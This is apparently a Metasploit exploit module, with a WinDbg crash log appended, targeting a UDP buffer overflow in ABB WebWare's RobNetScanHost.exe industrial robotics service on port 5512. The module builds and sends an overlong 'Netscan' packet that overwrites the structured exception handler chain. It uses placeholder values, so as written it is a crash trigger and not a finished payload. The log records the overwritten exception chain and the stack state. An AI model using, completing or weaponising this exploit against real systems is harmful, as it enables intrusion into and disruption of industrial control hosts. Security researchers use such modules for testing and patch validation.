require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ABB WebWare RobNetScanHost.exe Overflow',
			'Description'    => %q{
					This module is simply a trigger for the ABB WebWare
				RobNetScanHost.exe vulnerability.
			},
			'Author'         => [ 'Mario Ceballos' ],
			'References'     =>
				[
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-033/' ],

				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 350,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP3 English',    { 'Ret' => 0xfeedface} ],
				],
			'Privileged'     => true,
			'DisclosureDate' => 'Feb 22 2012'))

		register_options(
			[
				Opt::RPORT(5512)
			], self.class)

	end

	def exploit

		connect_udp

		print_status("Trying target #{target.name}...")

		data = Rex::Text.pattern_create(800)
		data[84, 4] = [0x42424242].pack('V')
		data[88, 4] = [0x41414141].pack('V')

		sploit = "Netscan;" + (data.size + 20).to_s(16) + ";7;0a;0e:" + data

		udp_sock.put(sploit)
		handler
		disconnect_udp

	end

end
__END__
discovery packet looks like:

Netscan;0d;7;

Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=60fefefe ebx=10023a90 ecx=0172fc2c edx=30654139 esi=0172f6e0 edi=0172ffff
eip=10011549 esp=0172f530 ebp=0172f5cc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Common Files\ABB Industrial IT\Robotics IT\RobAPI\RobNetScan.dll - 
RobNetScan!DllGetClassObject+0x9fa5:
10011549 8917            mov     dword ptr [edi],edx  ds:0023:0172ffff=????????
0:007> !exchain
0172f760: RobNetScan!DllGetClassObject+1b034 (100225d8)
0172ffdc: 41414141
Invalid exception stack at 42424242
0:007> dd ecx
0172fc2c  41316541 65413265 34654133 41356541
0172fc3c  65413665 38654137 41396541 66413066
0172fc4c  32664131 41336641 66413466 36664135
0172fc5c  41376641 66413866 30674139 41316741
0172fc6c  67413267 34674133 41356741 67413667
0172fc7c  38674137 41396741 68413068 32684131
0172fc8c  41336841 68413468 36684135 41376841
0172fc9c  68413868 30694139 41316941 69413269
0:007> k
ChildEBP RetAddr  
WARNING: Stack unwind information not available. Following frames may be wrong.
0172f5cc 41366441 RobNetScan!DllGetClassObject+0x9fa5
0172f5e0 7c80ae7e 0x41366441
0172f608 10014118 kernel32!GetProcAddress+0x3e
0172f684 10001083 RobNetScan!DllGetClassObject+0xcb74
0172f688 100019ae RobNetScan+0x1083
0172f6a0 1000261d RobNetScan+0x19ae
0172f6ac 10004d50 RobNetScan+0x261d
0172f77c 71ab265b RobNetScan+0x4d50
0172f790 71ab4a9e WS2_32!Ordinal496+0x265b
0172f7b8 7c90df5a WS2_32!connect+0x97
0172f7f8 71a55fa7 ntdll!ZwWaitForSingleObject+0xc
0172f8f8 10010e84 mswsock+0x5fa7
0172f938 10002277 RobNetScan!DllGetClassObject+0x98e0
0172fb4c 78131e9a RobNetScan+0x2277
0172fb5c 78131ed3 urlmon!DllCanUnloadNow+0x3b2
0172fb70 0172fb9c urlmon!DllCanUnloadNow+0x3eb
0172fb74 00000000 0x172fb9c
